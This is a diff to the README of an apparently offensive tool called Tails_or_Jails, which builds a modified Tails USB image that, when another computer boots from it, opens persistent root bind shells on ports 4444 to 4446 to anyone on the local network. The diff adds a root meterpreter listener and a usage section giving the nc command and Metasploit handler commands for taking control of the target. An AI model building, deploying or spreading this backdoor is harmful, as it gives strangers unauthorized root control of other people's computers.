@@ -20,10 +20,9 @@ By using this tool, you agree to use it solely for lawful purposes and not for a
 
 - Persistent remote access with highest privileges
 
-- Everyone on local network can control the system by connecting to machine's ip address (port 4444 for root and port 4445 for default user)
+- Everyone on local network can control the system by connecting to machine's ip address (port 4444 for root, port 4445 for fallback user shell and port 4446 for root meterpreter)
 
 <!-- BUILD -->
-
 ## Build it yourself:
       
     git clone https://github.com/umutcamliyurt/Tails_or_Jails.git
@@ -44,7 +43,7 @@ Open another terminal and enter:
     sudo mount --rbind /dev ~/img_mount/dev
     sudo mount --rbind /dev/pts ~/img_mount/dev/pts
     sudo chroot ~/img_mount /bin/bash
-    sudo chmod a+rx /.iptables.sh /.startup.sh /.startup_fallback.sh
+    sudo chmod a+rx /.iptables.sh /.startup.sh /.startup_fallback.sh /.system_startup.sh
     exit
     sudo umount ~/img_mount/proc
     sudo umount ~/img_mount/sys
@@ -82,9 +81,21 @@ Finally build the image:
 
   5. Click the Start Restoring button.
 
+<!-- USAGE -->
+## Usage:
+
 **Make another computer boot from this USB stick.**
 
-On your computer run `nc (target_ip) 4444` for controlling the target.
+**Option 1:** On your computer run `nc (target_ip) 4444`
+
+**Option 2:** Use Metasploit Framework
+
+    msfconsole
+    use exploit/multi/handler
+    set payload linux/x86/meterpreter/bind_tcp
+    set RHOST (target_ip)
+    set LPORT 4446
+    exploit
 
 
 <!-- LICENSE -->
